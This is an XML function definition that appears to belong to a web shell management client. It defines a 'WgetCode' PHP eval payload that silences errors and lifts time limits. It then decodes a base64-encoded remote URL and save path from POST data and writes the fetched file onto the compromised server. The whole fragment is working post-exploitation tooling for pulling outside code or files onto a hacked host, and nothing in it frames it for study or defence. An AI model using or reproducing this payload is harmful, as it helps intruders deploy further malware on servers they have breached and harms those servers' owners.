    <Func>
      <name>WgetCode</name>
	  <type>phpEval,phpEval_Cookie</type>
	  <funcParam location="Body" encrymode="Base64" >urlPath</funcParam>
	  <funcParam location="Body" encrymode="Base64" >saveFilePath</funcParam>
      <item><![CDATA[@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$fR=base64_decode($_POST["$urlPath$"]);
$fL=base64_decode($_POST["$saveFilePath$"]);
$F=@fopen($fR,'r');
$L=@fopen($fL,'w');
if($F && $L)
{
	while(!feof($F))
		@fwrite($L,@fgetc($F));
	@fclose($F);
	@fclose($L);
	echo("1");
}
else
{	
	echo("0");
}
echo("|<-");
die();]]></item>
    </Func>
